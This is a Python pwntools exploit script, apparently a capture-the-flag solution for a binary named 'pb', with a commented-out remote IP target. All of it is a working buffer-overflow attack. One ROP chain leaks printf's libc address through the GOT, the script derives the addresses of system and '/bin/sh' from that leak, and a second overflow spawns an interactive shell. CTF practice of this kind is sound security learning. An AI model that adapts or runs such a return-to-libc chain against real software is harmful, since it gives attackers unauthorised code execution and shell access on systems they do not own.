from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./pb")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "glibc/libc.so.6"}

#p = remote('159.65.86.238', 31248)
p = process("./pb", env=ld_preload)
#p = gdb.debug("./pb", '''
#break *main
#break *box
#break *box + 188
#break *box + 226''', env=ld_preload)

p.recvline()

p.sendline(b"2")
p.recvline()

# functions
start = p64(0x4010d0)
box = p64(0x00000000004012c2)

# Padding
padA = b'A' * 48                    # PADDING
padB = b'B' * 8                     # RBP
padC = b'C' * 8                     # EIP

# Gadgets
printf_plt = p64(0x00000000004011dd)    # puts_pltgot ended up in a crash at 'leave'
printf_pltgot = p64(0x403fa8)
pop_rdi = p64(0x000000000040142b)
ret = p64(0x0000000000401016)
leave_ret = p64(0x0000000000401239)
pop_rbp = p64(0x0000000000401199)

# 1st Exploit - libc_printf leak
exploit = padA + box + pop_rdi + printf_pltgot + printf_plt + ret + box

#pause()
p.clean()
p.sendline(exploit)
p.recvlines(2)

leak = p.recvn(8).strip()
libc_printf = unpack(leak, 'all')
libc_system = libc_printf - 64016
binsh = libc_printf + 1539880

print('libc_printf leak: ', hex(libc_printf))
print('libc_system leak: ', hex(libc_system))
print('/bin/sh leak: ', hex(binsh))

# 2nd Exploit - system('/bin/sh')
#pause()
p.sendline(b'2')
p.recvline()

padD = b'D' * 56

exploit2 = padD + pop_rdi + p64(binsh) + p64(libc_system)

p.sendline(exploit2)
p.interactive()
